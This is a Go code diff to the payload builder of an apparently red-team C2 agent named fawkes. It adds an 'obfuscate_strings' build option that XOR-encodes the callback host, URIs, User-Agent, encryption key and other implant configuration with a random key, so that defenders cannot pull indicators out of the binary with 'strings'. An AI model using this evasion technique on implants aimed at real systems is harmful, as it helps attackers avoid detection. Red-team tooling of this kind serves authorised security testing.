@@ -2,6 +2,7 @@ package agentfunctions
 
 import (
 	"bytes"
+	cryptorand "crypto/rand"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/json"
@@ -196,6 +197,13 @@ var payloadDefinition = agentstructs.PayloadType{
 			DefaultValue:  false,
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
 		},
+		{
+			Name:          "obfuscate_strings",
+			Description:   "XOR-encode C2 config strings (callback host, URIs, user agent, encryption key, UUID) at build time. Prevents trivial IOC extraction via 'strings' on the binary. Decoded at runtime with a per-build random key.",
+			Required:      false,
+			DefaultValue:  false,
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
+		},
 	},
 	BuildSteps: []agentstructs.BuildStep{
 		{
@@ -371,6 +379,88 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	}
 	if autoPatch, err := payloadBuildMsg.BuildParameters.GetBooleanArg("auto_patch"); err == nil && autoPatch {
 		ldflags += fmt.Sprintf(" -X '%s.autoPatch=true'", fawkes_main_package)
+	}
+
+	// String obfuscation: XOR-encode C2 config strings with a random key
+	if obfStrings, err := payloadBuildMsg.BuildParameters.GetBooleanArg("obfuscate_strings"); err == nil && obfStrings {
+		xorKey := make([]byte, 32)
+		if _, err := cryptorand.Read(xorKey); err != nil {
+			payloadBuildResponse.Success = false
+			payloadBuildResponse.BuildStdErr = fmt.Sprintf("Failed to generate XOR key: %v", err)
+			return payloadBuildResponse
+		}
+		xorKeyB64 := base64.StdEncoding.EncodeToString(xorKey)
+		ldflags += fmt.Sprintf(" -X '%s.xorKey=%s'", fawkes_main_package, xorKeyB64)
+
+		// Re-encode the C2 config strings already in ldflags by replacing them
+		// We need to extract, encode, and re-inject. Simpler approach: use a post-processing
+		// pass that finds and replaces known variable values.
+		// Instead, we'll set a flag and the variables were already added above as plaintext.
+		// The agent will decode them at runtime using the key.
+
+		// For string obfuscation we need to re-write the ldflags with encoded values.
+		// The approach: rebuild ldflags for the obfuscatable variables.
+		// First, extract the current values that were set, then rebuild with encoding.
+		type obfVar struct {
+			name  string
+			value string
+		}
+		var obfVars []obfVar
+
+		// Extract C2 profile string values for re-encoding
+		for _, key := range payloadBuildMsg.C2Profiles[0].GetArgNames() {
+			switch key {
+			case "callback_host":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"callbackHost", val})
+				}
+			case "callback_port":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"callbackPort", fmt.Sprintf("%d", int(val))})
+				}
+			case "get_uri":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"getURI", val})
+				}
+			case "post_uri":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"postURI", val})
+				}
+			case "headers":
+				if headerMap, err := payloadBuildMsg.C2Profiles[0].GetDictionaryArg(key); err == nil {
+					if uaVal, exists := headerMap["User-Agent"]; exists {
+						obfVars = append(obfVars, obfVar{"userAgent", uaVal})
+					}
+				}
+			case "AESPSK":
+				if cryptoVal, err := payloadBuildMsg.C2Profiles[0].GetCryptoArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"encryptionKey", cryptoVal.EncKey})
+				}
+			}
+		}
+		// Also encode payloadUUID, hostHeader, proxyURL, customHeaders
+		obfVars = append(obfVars, obfVar{"payloadUUID", payloadBuildMsg.PayloadUUID})
+		if hostHeader, err := payloadBuildMsg.BuildParameters.GetStringArg("host_header"); err == nil && hostHeader != "" {
+			obfVars = append(obfVars, obfVar{"hostHeader", hostHeader})
+		}
+		if proxyURL, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_url"); err == nil && proxyURL != "" {
+			obfVars = append(obfVars, obfVar{"proxyURL", proxyURL})
+		}
+
+		// Replace plaintext values in ldflags with XOR-encoded versions
+		for _, v := range obfVars {
+			plainPattern := fmt.Sprintf("-X '%s.%s=%s'", fawkes_main_package, v.name, v.value)
+			encodedVal := xorEncodeString(v.value, xorKey)
+			encodedPattern := fmt.Sprintf("-X '%s.%s=%s'", fawkes_main_package, v.name, encodedVal)
+			ldflags = strings.Replace(ldflags, plainPattern, encodedPattern, 1)
+		}
+		// customHeaders is already base64 — re-encode the base64 string itself
+		if customHeadersB64 := extractLdflagValue(ldflags, fawkes_main_package, "customHeaders"); customHeadersB64 != "" {
+			plainPattern := fmt.Sprintf("-X '%s.customHeaders=%s'", fawkes_main_package, customHeadersB64)
+			encodedVal := xorEncodeString(customHeadersB64, xorKey)
+			encodedPattern := fmt.Sprintf("-X '%s.customHeaders=%s'", fawkes_main_package, encodedVal)
+			ldflags = strings.Replace(ldflags, plainPattern, encodedPattern, 1)
+		}
 	}
 
 	architecture, err := payloadBuildMsg.BuildParameters.GetStringArg("architecture")
@@ -627,6 +717,34 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 
 	//payloadBuildResponse.Status = agentstructs.PAYLOAD_BUILD_STATUS_ERROR
 	return payloadBuildResponse
+}
+
+// extractLdflagValue extracts the value of a variable from ldflags string.
+func extractLdflagValue(ldflags, pkg, varName string) string {
+	prefix := fmt.Sprintf("-X '%s.%s=", pkg, varName)
+	idx := strings.Index(ldflags, prefix)
+	if idx < 0 {
+		return ""
+	}
+	start := idx + len(prefix)
+	end := strings.Index(ldflags[start:], "'")
+	if end < 0 {
+		return ""
+	}
+	return ldflags[start : start+end]
+}
+
+// xorEncodeString XOR-encodes a plaintext string with the given key and returns base64.
+func xorEncodeString(plaintext string, key []byte) string {
+	if len(key) == 0 || plaintext == "" {
+		return plaintext
+	}
+	data := []byte(plaintext)
+	result := make([]byte, len(data))
+	for i, b := range data {
+		result[i] = b ^ key[i%len(key)]
+	}
+	return base64.StdEncoding.EncodeToString(result)
 }
 
 func Initialize() {
